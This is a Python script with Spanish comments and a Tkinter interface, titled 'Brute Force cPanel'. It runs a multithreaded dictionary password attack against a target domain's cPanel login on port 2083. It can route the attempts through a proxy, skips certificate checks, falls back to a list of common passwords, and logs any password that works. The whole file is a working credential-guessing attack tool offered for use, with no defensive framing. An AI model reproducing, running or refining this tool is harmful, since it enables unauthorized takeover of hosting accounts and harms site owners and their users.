import requests
import time
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import tkinter as tk
from tkinter import scrolledtext

# Configuración de logging
logging.basicConfig(filename='brute_force.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Función para intentar el inicio de sesión
def intentar_login(usuario, password, cpanel_url, proxy=None):
    payload = {'user': usuario, 'pass': password}
    try:
        with requests.Session() as session:
            if proxy:
                session.proxies.update({'http': proxy, 'https': proxy})
            response = session.post(cpanel_url, data=payload, verify=False)
            logging.info(f"Intentando {password}: {response.status_code}")
            # Verifica si el login fue exitoso
            return response.status_code == 200 and ("Log out" in response.text or "dashboard" in response.url)
    except requests.RequestException as e:
        logging.error(f"Error en la solicitud: {e}")
        return False

# Cargar diccionario de contraseñas
def cargar_diccionario(file_path='passwords.txt'):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        logging.error(f"El archivo {file_path} no fue encontrado.")
        return ["password123", "admin", "cpanel", "123456", "root", "letmein"]

# Lógica principal
def brute_force(usuario, dominio_o_ip, max_intentos, tiempo_espera, max_tiempo, proxy=None):
    cpanel_url = f'https://{dominio_o_ip}:2083/login/'
    tiempo_inicial = time.time()

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {}
        for password in cargar_diccionario():
            futures[executor.submit(intentar_login, usuario, password, cpanel_url, proxy)] = password

        for future in as_completed(futures):
            if time.time() - tiempo_inicial >= max_tiempo:
                log_text.insert(tk.END, "Límite de tiempo alcanzado. Terminando el script...\n")
                logging.info("Límite de tiempo alcanzado. Terminando el script...")
                break
            
            password = futures[future]
            try:
                if future.result():
                    log_text.insert(tk.END, f"¡Login exitoso con la contraseña: {password}!\n")
                    logging.info(f"Login exitoso con la contraseña: {password}")
                    break
                else:
                    log_text.insert(tk.END, f"Contraseña incorrecta: {password}\n")
                    logging.warning(f"Contraseña incorrecta: {password}")
            except Exception as e:
                logging.error(f"Ocurrió un error: {e}")

            time.sleep(tiempo_espera)  # Esperar entre intentos

# Función para iniciar el ataque
def iniciar_ataque():
    dominio_o_ip = entry_dominio.get()
    usuario = entry_usuario.get()
    max_intentos = int(entry_intentos.get())
    tiempo_espera = int(entry_espera.get())
    max_tiempo = int(entry_tiempo.get()) * 60
    proxy = entry_proxy.get().strip()  # Leer proxy
    log_text.delete(1.0, tk.END)  # Limpiar el área de texto
    log_text.insert(tk.END, "Iniciando ataque...\n")
    brute_force(usuario, dominio_o_ip, max_intentos, tiempo_espera, max_tiempo, proxy)

# Configuración de la ventana principal
root = tk.Tk()
root.title("Brute Force cPanel")

# Crear elementos de la interfaz
label_dominio = tk.Label(root, text="Dominio o IP:")
label_dominio.pack()

entry_dominio = tk.Entry(root, width=30)
entry_dominio.pack()

label_usuario = tk.Label(root, text="Usuario cPanel:")
label_usuario.pack()

entry_usuario = tk.Entry(root, width=30)
entry_usuario.pack()

label_intentos = tk.Label(root, text="Máximo de intentos:")
label_intentos.pack()

entry_intentos = tk.Entry(root, width=30)
entry_intentos.pack()

label_espera = tk.Label(root, text="Tiempo de espera entre intentos (s):")
label_espera.pack()

entry_espera = tk.Entry(root, width=30)
entry_espera.pack()

label_tiempo = tk.Label(root, text="Límite de tiempo total (min):")
label_tiempo.pack()

entry_tiempo = tk.Entry(root, width=30)
entry_tiempo.pack()

label_proxy = tk.Label(root, text="Proxy (opcional):")
label_proxy.pack()

entry_proxy = tk.Entry(root, width=30)
entry_proxy.pack()

button_iniciar = tk.Button(root, text="Iniciar Ataque", command=iniciar_ataque)
button_iniciar.pack()

log_text = scrolledtext.ScrolledText(root, width=50, height=20)
log_text.pack()

# Ejecutar la interfaz gráfica
root.mainloop()
